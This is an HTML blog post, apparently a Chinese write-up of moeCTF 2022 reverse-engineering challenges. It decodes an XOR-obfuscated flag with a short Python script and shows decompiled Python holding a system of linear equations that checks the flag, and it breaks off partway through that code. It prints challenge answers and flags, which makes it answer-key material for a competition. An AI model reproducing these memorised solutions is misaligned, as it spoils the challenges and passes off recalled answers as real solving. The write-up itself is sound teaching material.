    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h1><h2 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h2><p>直接先查壳放入64位的ida中，找相应的flag<br><code>moectf&#123;Enjoy_yourself_in_Reverse_Engineering!!!&#125;</code></p><h2 id="begin"><a href="#begin" class="headerlink" title="begin"></a>begin</h2><p>查看程序信息之后用ida64位打开,F5查看主函数<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/moeCTF20221114.assets/1668388864242-b11b2a19-a7d4-445e-8205-d9570d3dd871-1697122861310-1.png"                      alt="image.png"                ><br>读伪代码，发现是输入的Str内容进行与0x19异或之后与最后的Str2的内容进行对比，打开的Str2的密文：<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/moeCTF20221114.assets/1668389062998-13140cd6-f06d-4795-b015-1eadededff7f.png"                      alt="image.png"                ><br>导出数据<code>shift+e</code>，进行异或脚本：</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">str2 = [<span class="number">116</span>, <span class="number">118</span>, <span class="number">124</span>, <span class="number">122</span>, <span class="number">109</span>, <span class="number">127</span>,  <span class="number">98</span>,  <span class="number">65</span>,  <span class="number">41</span>, <span class="number">107</span>, </span><br><span class="line">   <span class="number">70</span>,  <span class="number">40</span>, <span class="number">106</span>,  <span class="number">70</span>, <span class="number">106</span>,  <span class="number">41</span>,  <span class="number">70</span>, <span class="number">112</span>, <span class="number">119</span>, <span class="number">109</span>, </span><br><span class="line">   <span class="number">42</span>, <span class="number">107</span>,  <span class="number">42</span>, <span class="number">106</span>, <span class="number">109</span>, <span class="number">112</span>, <span class="number">119</span>, <span class="number">126</span>,  <span class="number">56</span>,  <span class="number">56</span>, </span><br><span class="line">   <span class="number">56</span>,  <span class="number">56</span>,  <span class="number">56</span>, <span class="number">100</span>] </span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(str2)):</span><br><span class="line">    flag+=<span class="built_in">chr</span>(str2[i]^<span class="number">0x19</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">## moectf&#123;X0r_1s_s0_int3r3sting!!!!!&#125;</span></span><br></pre></td></tr></table></figure></div><h2 id="EquationPy"><a href="#EquationPy" class="headerlink" title="EquationPy"></a>EquationPy</h2><p>一看就是python的逆向，用uncompyle6或者用的在线的网站(<a class="link"   href="https://tool.lu/pyc/" >python反编译 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>)先进行反编译<br>反编译出的python代码如下</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># visit https://tool.lu/pyc/ for more information</span></span><br><span class="line"><span class="comment"># Version: Python 3.8</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Maybe z3 can help you solve this challenge.&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Now give me your flag, and I will check for you.&#x27;</span>)</span><br><span class="line">flag = <span class="built_in">input</span>(<span class="string">&#x27;Input your flag:&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(flag) == <span class="number">22</span> </span><br><span class="line"><span class="keyword">and</span> <span class="built_in">ord</span>(flag[<span class="number">0</span>]) * <span class="number">7072</span> + <span class="built_in">ord</span>(flag[<span class="number">1</span>]) * <span class="number">2523</span> + <span class="built_in">ord</span>(flag[<span class="number">2</span>]) * <span class="number">6714</span> + <span class="built_in">ord</span>(flag[<span class="number">3</span>]) * <span class="number">8810</span> + <span class="built_in">ord</span>(flag[<span class="number">4</span>]) * <span class="number">6796</span> + <span class="built_in">ord</span>(flag[<span class="number">5</span>]) * <span class="number">2647</span> + <span class="built_in">ord</span>(flag[<span class="number">6</span>]) * <span class="number">1347</span> + <span class="built_in">ord</span>(flag[<span class="number">7</span>]) * <span class="number">1289</span> + <span class="built_in">ord</span>(flag[<span class="number">8</span>]) * <span class="number">8917</span> + <span class="built_in">ord</span>(flag[<span class="number">9</span>]) * <span class="number">2304</span> + <span class="built_in">ord</span>(flag[<span class="number">10</span>]) * <span class="number">5001</span> + <span class="built_in">ord</span>(flag[<span class="number">11</span>]) * <span class="number">2882</span> + <span class="built_in">ord</span>(flag[<span class="number">12</span>]) * <span class="number">7232</span> + <span class="built_in">ord</span>(flag[<span class="number">13</span>]) * <span class="number">3192</span> + <span class="built_in">ord</span>(flag[<span class="number">14</span>]) * <span class="number">9676</span> + <span class="built_in">ord</span>(flag[<span class="number">15</span>]) * <span class="number">5436</span> + <span class="built_in">ord</span>(flag[<span class="number">16</span>]) * <span class="number">4407</span> + <span class="built_in">ord</span>(flag[<span class="number">17</span>]) * <span class="number">6269</span> + <span class="built_in">ord</span>(flag[<span class="number">18</span>]) * <span class="number">9623</span> + <span class="built_in">ord</span>(flag[<span class="number">19</span>]) * <span class="number">6230</span> + <span class="built_in">ord</span>(flag[<span class="number">20</span>]) * <span class="number">6292</span> + <span class="built_in">ord</span>(flag[<span class="number">21</span>]) * <span class="number">57</span> == <span class="number">10743134</span> </span><br><span class="line"><span class="keyword">and</span> <span class="built_in">ord</span>(flag[<span class="number">0</span>]) * <span class="number">3492</span> + <span class="built_in">ord</span>(flag[<span class="number">1</span>]) * <span class="number">1613</span> + <span class="built_in">ord</span>(flag[<span class="number">2</span>]) * <span class="number">3234</span> + <span class="built_in">ord</span>(flag[<span class="number">3</span>]) * <span class="number">5656</span> + <span class="built_in">ord</span>(flag[<span class="number">4</span>]) * <span class="number">9182</span> + <span class="built_in">ord</span>(flag[<span class="number">5</span>]) * <span class="number">4240</span> + <span class="built_in">ord</span>(flag[<span class="number">6</span>]) * <span class="number">8808</span> + <span class="built_in">ord</span>(flag[<span class="number">7</span>]) * <span class="number">9484</span> + <span class="built_in">ord</span>(flag[<span class="number">8</span>]) * <span class="number">4000</span> + <span class="built_in">ord</span>(flag[<span class="number">9</span>]) * <span class="number">1475</span> + <span class="built_in">ord</span>(flag[<span class="number">10</span>]) * <span class="number">2616</span> + <span class="built_in">ord</span>(flag[<span class="number">11</span>]) * <span class="number">2766</span> + <span class="built_in">ord</span>(flag[<span class="number">12</span>]) * <span class="number">6822</span> + <span class="built_in">ord</span>(flag[<span class="number">13</span>]) * <span class="number">1068</span> + <span class="built_in">ord</span>(flag[<span class="number">14</span>]) * <span class="number">9768</span> + <span class="built_in">ord</span>(flag[<span class="number">15</span>]) * <span class="number">1420</span> + <span class="built_in">ord</span>(flag[<span class="number">16</span>]) * <span class="number">4528</span> + <span class="built_in">ord</span>(flag[<span class="number">17</span>]) * <span class="number">1031</span> + <span class="built_in">ord</span>(flag[<span class="number">18</span>]) * <span class="number">8388</span> + <span class="built_in">ord</span>(flag[<span class="number">19</span>]) * <span class="number">2029</span> + <span class="built_in">ord</span>(flag[<span class="number">20</span>]) * <span class="number">2463</span> + <span class="built_in">ord</span>(flag[<span class="number">21</span>]) * <span class="number">32</span> == <span class="number">9663091</span> </span><br><span class="line"><span class="keyword">and</span> <span class="built_in">ord</span>(flag[<span class="number">0</span>]) * <span class="number">9661</span> + <span class="built_in">ord</span>(flag[<span class="number">1</span>]) * <span class="number">1108</span> + <span class="built_in">ord</span>(flag[<span class="number">2</span>]) * <span class="number">2229</span> + <span class="built_in">ord</span>(flag[<span class="number">3</span>]) * <span class="number">1256</span> + <span class="built_in">ord</span>(flag[<span class="number">4</span>]) * <span class="number">7747</span> + <span class="built_in">ord</span>(flag[<span class="number">5</span>]) * <span class="number">5775</span> + <span class="built_in">ord</span>(flag[<span class="number">6</span>]) * <span class="number">5211</span> + <span class="built_in">ord</span>(flag[<span class="number">7</span>]) * <span class="number">2387</span> + <span class="built_in">ord</span>(flag[<span class="number">8</span>]) * <span class="number">1997</span> + <span class="built_in">ord</span>(flag[<span class="number">9</span>]) * <span class="number">4045</span> + <span class="built_in">ord</span>(flag[<span class="number">10</span>]) * <span class="number">7102</span> + <span class="built_in">ord</span>(flag[<span class="number">11</span>]) * <span class="number">7853</span> + <span class="built_in">ord</span>(flag[<span class="number">12</span>]) * <span class="number">5596</span> + <span class="built_in">ord</span>(flag[<span class="number">13</span>]) * <span class="number">6952</span> + <span class="built_in">ord</span>(flag[<span class="number">14</span>]) * <span class="number">8883</span> + <span class="built_in">ord</span>(flag[<span class="number">15</span>]) * <span class="number">5125</span> + <span class="built_in">ord</span>(flag[<span class="number">16</span>]) * <span class="number">9572</span> + <span class="built_in">ord</span>(flag[<span class="number">17</span>]) * <span class="number">1149</span> + <span class="built_in">ord</span>(flag[<span class="number">18</span>]) * <span class="number">7583</span> + <span class="built_in">ord</span>(flag[<span class="number">19</span>]) * <span class="number">1075</span> + <span class="built_in">ord</span>(flag[<span class="number">20</span>]) * <span class="number">9804</span> + <span class="built_in">ord</span>(flag[<span class="number">21</span>]) * <span class="number">72</span> == <span class="number">10521461</span> </span><br><span class="line"><span class="keyword">and</span> <span class="built_in">ord</span>(flag[<span class="number">0</span>]) * <span class="number">4314</span> + <span class="built_in">ord</span>(flag[<span class="number">1</span>]) * <span class="number">3509</span> + <span class="built_in">ord</span>(flag[<span class="number">2</span>]) * <span class="number">6200</span> + <span class="built_in">ord</span>(flag[<span class="number">3</span>]) * <span class="number">5546</span> + <span class="built_in">ord</span>(flag[<span class="number">4</span>]) * <span class="number">1705</span> + <span class="built_in">ord</span>(flag[<span class="number">5</span>]) * <span class="number">9518</span> + <span class="built_in">ord</span>(flag[<span class="number">6</span>]) * <span class="number">2975</span> + <span class="built_in">ord</span>(flag[<span class="number">7</span>]) * <span class="number">2689</span> + <span class="built_in">ord</span>(flag[<span class="number">8</span>]) * <span class="number">2412</span> + <span class="built_in">ord</span>(flag[<span class="number">9</span>]) * <span class="number">8659</span> + <span class="built_in">ord</span>(flag[<span class="number">10</span>]) * <span class="number">5459</span> + <span class="built_in">ord</span>(flag[<span class="number">11</span>]) * <span class="number">7572</span> + <span class="built_in">ord</span>(flag[<span class="number">12</span>]) * <span class="number">3042</span> + <span class="built_in">ord</span>(flag[<span class="number">13</span>]) * <span class="number">9701</span> + <span class="built_in">ord</span>(flag[<span class="number">14</span>]) * <span class="number">4697</span> + <span class="built_in">ord</span>(flag[<span class="number">15</span>]) * <span class="number">9863</span> + <span class="built_in">ord</span>(flag[<span class="number">16</span>]) * <span class="number">1296</span> + <span class="built_in">ord</span>(flag[<span class="number">17</span>]) * <span class="number">1278</span> + <span class="built_in">ord</span>(flag[<span class="number">18</span>]) * <span class="number">5721</span> + <span class="built_in">ord</span>(flag[<span class="number">19</span>]) * <span class="number">5116</span> + <span class="built_in">ord</span>(flag[<span class="number">20</span>]) * <span class="number">4147</span> + <span class="built_in">ord</span>(flag[<span class="number">21</span>]) * <span class="number">52</span> == <span class="number">9714028</span> </span><br><span class="line"><span class="keyword">and</span> <span class="built_in">ord</span>(flag[<span class="number">0</span>]) * <span class="number">2310</span> + <span class="built_in">ord</span>(flag[<span class="number">1</span>]) * <span class="number">1379</span> + <span class="built_in">ord</span>(flag[<span class="number">2</span>]) * <span class="number">5900</span> + <span class="built_in">ord</span>(flag[<span class="number">3</span>]) * <span class="number">4876</span> + <span class="built_in">ord</span>(flag[<span class="number">4</span>]) * <span class="number">5329</span> + <span class="built_in">ord</span>(flag[<span class="number">5</span>]) * <span class="number">6485</span> + <span class="built_in">ord</span>(flag[<span class="number">6</span>]) * <span class="number">6610</span> + <span class="built_in">ord</span>(flag[<span class="number">7</span>]) * <span class="number">7179</span> + <span class="built_in">ord</span>(flag[<span class="number">8</span>]) * <span class="number">7897</span> + <span class="built_in">ord</span>(flag[<span class="number">9</span>]) * <span class="number">1094</span> + <span class="built_in">ord</span>(flag[<span class="number">10</span>]) * <span class="number">4825</span> + <span class="built_in">ord</span>(flag[<span class="number">11</span>]) * <span class="number">8101</span> + <span class="built_in">ord</span>(flag[<span class="number">12</span>]) * <span class="number">9519</span> + <span class="built_in">ord</span>(flag[<span class="number">13</span>]) * <span class="number">3048</span> + <span class="built_in">ord</span>(flag[<span class="number">14</span>]) * <span class="number">3168</span> + <span class="built_in">ord</span>(flag[<span class="number">15</span>]) * <span class="number">2775</span> + <span class="built_in">ord</span>(flag[<span class="number">16</span>]) * <span class="number">4366</span> + <span class="built_in">ord</span>(flag[<span class="number">17</span>]) * <span class="number">4066</span> + <span class="built_in">ord</span>(flag[<span class="number">18</span>]) * <span class="number">7490</span> + <span class="built_in">ord</span>(flag[<span class="number">19</span>]) * <span class="number">5533</span> + <span class="built_in">ord</span>(flag[<span class="number">20</span>]) * <span class="number">2139</span> + <span class="built_in">ord</span>(flag[<span class="number">21</span>]) * <span class="number">87</span> == <span class="number">10030960</span> </span><br><span class="line"><span class="keyword">and</span> <span class="built_in">ord</span>(flag[<span class="number">0</span>]) * <span class="number">1549</span> + <span class="built_in">ord</span>(flag[<span class="number">1</span>]) * <span class="number">8554</span> + <span class="built_in">ord</span>(flag[<span class="number">2</span>]) * <span class="number">6510</span> + <span class="built_in">ord</span>(flag[<span class="number">3</span>]) * <span class="number">6559</span> + <span class="built_in">ord</span>(flag[<span class="number">4</span>]) * <span class="number">5570</span> + <span class="built_in">ord</span>(flag[<span class="number">5</span>]) * <span class="number">1003</span> + <span class="built_in">ord</span>(flag[<span class="number">6</span>]) * <span class="number">8562</span> + <span class="built_in">ord</span>(flag[<span class="number">7</span>]) * <span class="number">6793</span> + <span class="built_in">ord</span>(flag[<span class="number">8</span>]) * <span class="number">3509</span> + <span class="built_in">ord</span>(flag[<span class="number">9</span>]) * <span class="number">4965</span> + <span class="built_in">ord</span>(flag[<span class="number">10</span>]) * <span class="number">6111</span> + <span class="built_in">ord</span>(flag[<span class="number">11</span>]) * <span class="number">1229</span> + <span class="built_in">ord</span>(flag[<span class="number">12</span>]) * <span class="number">5654</span> + <span class="built_in">ord</span>(flag[<span class="number">13</span>]) * <span class="number">2204</span> + <span class="built_in">ord</span>(flag[<span class="number">14</span>]) * <span class="number">2217</span> + <span class="built_in">ord</span>(flag[<span class="number">15</span>]) * <span class="number">5039</span> + <span class="built_in">ord</span>(flag[<span class="number">16</span>]) * <span class="number">5657</span> + <span class="built_in">ord</span>(flag[<span class="number">17</span>]) * <span class="number">9426</span> + <span class="built_in">ord</span>(flag[<span class="number">18</span>]) * <span class="number">7604</span> + <span class="built_in">ord</span>(flag[<span class="number">19</span>]) * <span class="number">5883</span> + <span class="built_in">ord</span>(flag[<span class="number">20</span>]) * <span class="number">5285</span> + <span class="built_in">ord</span>(flag[<span class="number">21</span>]) * <span class="number">17</span> == <span class="number">10946682</span> </span><br><span class="line"><span class="keyword">and</span> <span class="built_in">ord</span>(flag[<span class="number">0</span>]) * <span class="number">2678</span> + <span class="built_in">ord</span>(flag[<span class="number">1</span>]) * <span class="number">4369</span> + <span class="built_in">ord</span>(flag[<span class="number">2</span>]) * <span class="number">7509</span> + <span class="built_in">ord</span>(flag[<span class="number">3</span>]) * <span class="number">1564</span> + <span class="built_in">ord</span>(flag[<span class="number">4</span>]) * <span class="number">7777</span> + <span class="built_in">ord</span>(flag[<span class="number">5</span>]) * <span class="number">2271</span> + <span class="built_in">ord</span>(flag[<span class="number">6</span>]) * <span class="number">9696</span> + <span class="built_in">ord</span>(flag[<span class="number">7</span>]) * <span class="number">3874</span> + <span class="built_in">ord</span>(flag[<span class="number">8</span>]) * <span class="number">2212</span> + <span class="built_in">ord</span>(flag[<span class="number">9</span>]) * <span class="number">6764</span> + <span class="built_in">ord</span>(flag[<span class="number">10</span>]) * <span class="number">5727</span> + <span class="built_in">ord</span>(flag[<span class="number">11</span>]) * <span class="number">5971</span> + <span class="built_in">ord</span>(flag[<span class="number">12</span>]) * <span class="number">5876</span> + <span class="built_in">ord</span>(flag[<span class="number">13</span>]) * <span class="number">9959</span> + <span class="built_in">ord</span>(flag[<span class="number">14</span>]) * <span class="number">4604</span> + <span class="built_in">ord</span>(flag[<span class="number">15</span>]) * <span class="number">8461</span> + <span class="built_in">ord</span>(flag[<span class="number">16</span>]) * <span class="number">2350</span> + <span class="built_in">ord</span>(flag[<span class="number">17</span>]) * <span class="number">3564</span> + <span class="built_in">ord</span>(flag[<span class="number">18</span>]) * <span class="number">1831</span> + <span class="built_in">ord</span>(flag[<span class="number">19</span>]) * <span class="number">6088</span> + <span class="built_in">ord</span>(flag[<span class="number">20</span>]) * <span class="number">4575</span> + <span class="built_in">ord</span>(flag[<span class="number">21</span>]) * <span class="number">9</span> == <span class="number">10286414</span> </span><br><span class="line"><span class="keyword">and</span> <span class="built_in">ord</span>(flag[<span class="number">0</span>]) * <span class="number">8916</span> + <span class="built_in">ord</span>(flag[<span class="number">1</span>]) * <span class="number">8647</span> + <span class="built_in">ord</span>(flag[<span class="number">2</span>]) * <span class="number">4522</span> + <span class="built_in">ord</span>(flag[<span class="number">3</span>]) * <span class="number">3579</span> + <span class="built_in">ord</span>(flag[<span class="number">4</span>]) * <span class="number">5319</span> + <span class="built_in">ord</span>(flag[<span class="number">5</span>]) * <span class="number">9124</span> + <span class="built_in">ord</span>(flag[<span class="number">6</span>]) * <span class="number">9535</span> + <span class="built_in">ord</span>(flag[<span class="number">7</span>]) * <span class="number">5125</span> +<span class="built_in">ord</span>(flag[<span class="number">8</span>]) * <span class="number">3235</span> + <span class="built_in">ord</span>(flag[<span class="number">9</span>]) * <span class="number">3246</span> + <span class="built_in">ord</span>(flag[<span class="number">10</span>]) * <span class="number">3378</span> + <span class="built_in">ord</span>(flag[<span class="number">11</span>]) * <span class="number">9221</span> + <span class="built_in">ord</span>(flag[<span class="number">12</span>]) * <span class="number">1875</span> + <span class="built_in">ord</span>(flag[<span class="number">13</span>]) * <span class="number">1008</span> + <span class="built_in">ord</span>(flag[<span class="number">14</span>]) * <span class="number">6262</span> + <span class="built_in">ord</span>(flag[<span class="number">15</span>]) * <span class="number">1524</span> +<span class="built_in">ord</span>(flag[<span class="number">16</span>]) * <span class="number">8851</span> + <span class="built_in">ord</span>(flag[<span class="number">17</span>]) * <span class="number">4367</span> + <span class="built_in">ord</span>(flag[<span class="number">18</span>]) * <span class="number">7628</span> + <span class="built_in">ord</span>(flag[<span class="number">19</span>]) * <span class="number">9404</span> + <span class="built_in">ord</span>(flag[<span class="number">20</span>]) * <span class="number">2065</span> + <span class="built_in">ord</span>(flag[<span class="number">21</span>]) * <span class="number">9</span> == <span class="number">11809388</span> </span><br><span class="line"><span class="keyword">and</span> <span class="built_in">ord</span>(flag[<span class="number">0</span>]) * <span class="number">9781</span> + <span class="built_in">ord</span>(flag[<span class="number">1</span>]) * <span class="number">9174</span> + <span class="built_in">ord</span>(flag[<span class="number">2</span>]) * <span class="number">3771</span> + <span class="built_in">ord</span>(flag[<span class="number">3</span>]) * <span class="number">6972</span> + <span class="built_in">ord</span>(flag[<span class="number">4</span>]) * <span class="number">6425</span> + <span class="built_in">ord</span>(flag[<span class="number">5</span>]) * <span class="number">7631</span> + <span class="built_in">ord</span>(flag[<span class="number">6</span>]) * <span class="number">8864</span> + <span class="built_in">ord</span>(flag[<span class="number">7</span>]) * <span class="number">9117</span> + <span class="built_in">ord</span>(flag[<span class="number">8</span>]) * <span class="number">4328</span> + <span class="built_in">ord</span>(flag[<span class="number">9</span>]) * <span class="number">3919</span> + <span class="built_in">ord</span>(flag[<span class="number">10</span>]) * <span class="number">6517</span> + <span class="built_in">ord</span>(flag[<span class="number">11</span>]) * <span class="number">7165</span> + <span class="built_in">ord</span>(flag[<span class="number">12</span>]) * <span class="number">6895</span> + <span class="built_in">ord</span>(flag[<span class="number">13</span>]) * <span class="number">3609</span> + <span class="built_in">ord</span>(flag[<span class="number">14</span>]) * <span class="number">3878</span> + <span class="built_in">ord</span>(flag[<span class="number">15</span>]) * <span class="number">1593</span> + <span class="built_in">ord</span>(flag[<span class="number">16</span>]) * <span class="number">9098</span> + <span class="built_in">ord</span>(flag[<span class="number">17</span>]) * <span class="number">6432</span> + <span class="built_in">ord</span>(flag[<span class="number">18</span>]) * <span class="number">2584</span> + <span class="built_in">ord</span>(flag[<span class="number">19</span>]) * <span class="number">8403</span> + <span class="built_in">ord</span>(flag[<span class="number">20</span>]) * <span class="number">4029</span> + <span class="built_in">ord</span>(flag[<span class="number">21</span>]) * <span class="number">30</span> == <span class="number">13060508</span> </span><br><span class="line"><span class="keyword">and</span> <span class="built_in">ord</span>(flag[<span class="number">0</span>]) * <span class="number">2511</span> + <span class="built_in">ord</span>(flag[<span class="number">1</span>]) * <span class="number">8583</span> + <span class="built_in">ord</span>(flag[<span class="number">2</span>]) * <span class="number">2428</span> + <span class="built_in">ord</span>(flag[<span class="number">3</span>]) * <span class="number">9439</span> + <span class="built_in">ord</span>(flag[<span class="number">4</span>]) * <span class="number">3662</span> + <span class="built_in">ord</span>(flag[<span class="number">5</span>]) * <span class="number">3278</span> + <span class="built_in">ord</span>(flag[<span class="number">6</span>]) * <span class="number">8305</span> + <span class="built_in">ord</span>(flag[<span class="number">7</span>]) * <span class="number">1100</span> + <span class="built_in">ord</span>(flag[<span class="number">8</span>]) * <span class="number">7972</span> + <span class="built_in">ord</span>(flag[<span class="number">9</span>]) * <span class="number">8510</span> + <span class="built_in">ord</span>(flag[<span class="number">10</span>]) * <span class="number">8552</span> + <span class="built_in">ord</span>(flag[<span class="number">11</span>]) * <span class="number">9993</span> + <span class="built_in">ord</span>(flag[<span class="number">12</span>]) * <span class="number">6855</span> + <span class="built_in">ord</span>(flag[<span class="number">13</span>]) * <span class="number">1702</span> + <span class="built_in">ord</span>(flag[<span class="number">14</span>]) * <span class="number">1640</span> + <span class="built_in">ord</span>(flag[<span class="number">15</span>]) * <span class="number">3787</span> + <span class="built_in">ord</span>(flag[<span class="number">16</span>]) * <span class="number">8161</span> + <span class="built_in">ord</span>(flag[<span class="number">17</span>]) * <span class="number">2110</span> + <span class="built_in">ord</span>(flag[<span class="number">18</span>]) * <span class="number">5320</span> + <span class="built_in">ord</span>(flag[<span class="number">19</span>]) * <span class="number">3313</span> + <span class="built_in">ord</span>(flag[<span class="number">20</span>]) * <span class="number">9286</span> + <span class="built_in">ord</span>(flag[<span class="number">21</span>]) * <span class="number">74</span> == <span class="number">10568195</span> </span><br><span class="line"><span class="keyword">and</span> <span class="built_in">ord</span>(flag[<span class="number">0</span>]) * <span class="number">4974</span> + <span class="built_in">ord</span>(flag[<span class="number">1</span>]) * <span class="number">4445</span> + <span class="built_in">ord</span>(flag[<span class="number">2</span>]) * <span class="number">7368</span> + <span class="built_in">ord</span>(flag[<span class="number">3</span>]) * <span class="number">9132</span> + <span class="built_in">ord</span>(flag[<span class="number">4</span>]) * <span class="number">5894</span> + <span class="built_in">ord</span>(flag[<span class="number">5</span>]) * <span class="number">7822</span> + <span class="built_in">ord</span>(flag[<span class="number">6</span>]) * <span class="number">7923</span> + <span class="built_in">ord</span>(flag[<span class="number">7</span>]) * <span class="number">6822</span> + <span class="built_in">ord</span>(flag[<span class="number">8</span>]) * <span class="number">2698</span> + <span class="built_in">ord</span>(flag[<span class="number">9</span>]) * <span class="number">3643</span> + <span class="built_in">ord</span>(flag[<span class="number">10</span>]) * <span class="number">8392</span> + <span class="built_in">ord</span>(flag[<span class="number">11</span>]) * <span class="number">4126</span> + <span class="built_in">ord</span>(flag[<span class="number">12</span>]) * <span class="number">1941</span> + <span class="built_in">ord</span>(flag[<span class="number">13</span>]) * <span class="number">6641</span> + <span class="built_in">ord</span>(flag[<span class="number">14</span>]) * <span class="number">2949</span> + <span class="built_in">ord</span>(flag[<span class="number">15</span>]) * <span class="number">7405</span> + <span class="built_in">ord</span>(flag[<span class="number">16</span>]) * <span class="number">9980</span> + <span class="built_in">ord</span>(flag[<span class="number">17</span>]) * <span class="number">6349</span> + <span class="built_in">ord</span>(flag[<span class="number">18</span>]) * <span class="number">3328</span> + <span class="built_in">ord</span>(flag[<span class="number">19</span>]) * <span class="number">8766</span> + <span class="built_in">ord</span>(flag[<span class="number">20</span>]) * <span class="number">9508</span> + <span class="built_in">ord</span>(flag[<span class="number">21</span>]) * <span class="number">65</span> == <span class="number">12514783</span> </span><br><span class="line"><span class="keyword">and</span> <span class="built_in">ord</span>(flag[<span class="number">0</span>]) * <span class="number">4127</span> + <span class="built_in">ord</span>(flag[<span class="number">1</span>]) * <span class="number">4703</span> + <span class="built_in">ord</span>(flag[<span class="number">2</span>]) * <span class="number">6409</span> + <span class="built_in">ord</span>(flag[<span class="number">3</span>]) * <span class="number">4907</span> +<span class="built_in">ord</span>(flag[<span class="number">4</span>]) * <span class="number">5230</span> + <span class="built_in">ord</span>(flag[<span class="number">5</span>]) * <span class="number">3371</span> + <span class="built_in">ord</span>(flag[<span class="number">6</span>]) * <span class="number">5666</span> + <span class="built_in">ord</span>(flag[<span class="number">7</span>]) * <span class="number">3194</span> + <span class="built_in">ord</span>(flag[<span class="number">8</span>]) * <span class="number">5448</span> + <span class="built_in">ord</span>(flag[<span class="number">9</span>]) * <span class="number">8415</span> + <span class="built_in">ord</span>(flag[<span class="number">10</span>]) * <span class="number">4525</span> + <span class="built_in">ord</span>(flag[<span class="number">11</span>]) * <span class="number">4152</span> + <span class="built_in">ord</span>(flag[<span class="number">12</span>]) * <span class="number">1467</span> + <span class="built_in">ord</span>(flag[<span class="number">13</span>]) * <span class="number">5254</span> + <span class="built_in">ord</span>(flag[<span class="number">14</span>]) * <span class="number">2256</span> + <span class="built_in">ord</span>(flag[<span class="number">15</span>]) * <span class="number">1643</span> + <span class="built_in">ord</span>(flag[<span class="number">16</span>]) * <span class="number">9113</span> + <span class="built_in">ord</span>(flag[<span class="number">17</span>]) * <span class="number">8805</span> + <span class="built_in">ord</span>(flag[<span class="number">18</span>]) * <span class="number">4315</span> + <span class="built_in">ord</span>(flag[<span class="number">19</span>]) * <span class="number">8371</span> + <span class="built_in">ord</span>(flag[<span class="number">20</span>]) * <span class="number">1919</span> + <span class="built_in">ord</span>(flag[<span class="number">21</span>]) * <span class="number">2</span> == <span class="number">10299950</span> </span><br><span class="line"><span class="keyword">and</span> <span class="built_in">ord</span>(flag[<span class="number">0</span>]) * <span class="number">6245</span> + <span class="built_in">ord</span>(flag[<span class="number">1</span>]) * <span class="number">8783</span> + <span class="built_in">ord</span>(flag[<span class="number">2</span>]) * <span class="number">6059</span> + <span class="built_in">ord</span>(flag[<span class="number">3</span>]) * <span class="number">9375</span> + <span class="built_in">ord</span>(flag[<span class="number">4</span>]) * <span class="number">9253</span> + <span class="built_in">ord</span>(flag[<span class="number">5</span>]) * <span class="number">1974</span> + <span class="built_in">ord</span>(flag[<span class="number">6</span>]) * <span class="number">8867</span> + <span class="built_in">ord</span>(flag[<span class="number">7</span>]) * <span class="number">6423</span> + <span class="built_in">ord</span>(flag[<span class="number">8</span>]) * <span class="number">2577</span> + <span class="built_in">ord</span>(flag[<span class="number">9</span>]) * <span class="number">6613</span> + <span class="built_in">ord</span>(flag[<span class="number">10</span>]) * <span class="number">2040</span> + <span class="built_in">ord</span>(flag[<span class="number">11</span>]) * <span class="number">2209</span> + <span class="built_in">ord</span>(flag[<span class="number">12</span>]) * <span class="number">4147</span> + <span class="built_in">ord</span>(flag[<span class="number">13</span>]) * <span class="number">7151</span> + <span class="built_in">ord</span>(flag[<span class="number">14</span>]) * <span class="number">1011</span> + <span class="built_in">ord</span>(flag[<span class="number">15</span>]) * <span class="number">9446</span> +<span class="built_in">ord</span>(flag[<span class="number">16</span>]) * <span class="number">4362</span> + <span class="built_in">ord</span>(flag[<span class="number">17</span>]) * <span class="number">3073</span> + <span class="built_in">ord</span>(flag[<span class="number">18</span>]) * <span class="number">3006</span> + <span class="built_in">ord</span>(flag[<span class="number">19</span>]) * <span class="number">5499</span> + <span class="built_in">ord</span>(flag[<span class="number">20</span>]) * <span class="number">8850</span> + <span class="built_in">ord</span>(flag[<span class="number">21</span>]) * <span class="number">23</span> == <span class="number">11180727</span> </span><br><span class="line"><span class="keyword">and</span> <span class="built_in">ord</span>(flag[<span class="number">0</span>]) * <span class="number">1907</span> + <span class="built_in">ord</span>(flag[<span class="number">1</span>]) * <span class="number">9038</span> + <span class="built_in">ord</span>(flag[<span class="number">2</span>]) * <span class="number">3932</span> + <span class="built_in">ord</span>(flag[<span class="number">3</span>]) * <span class="number">7054</span> + <span class="built_in">ord</span>(flag[<span 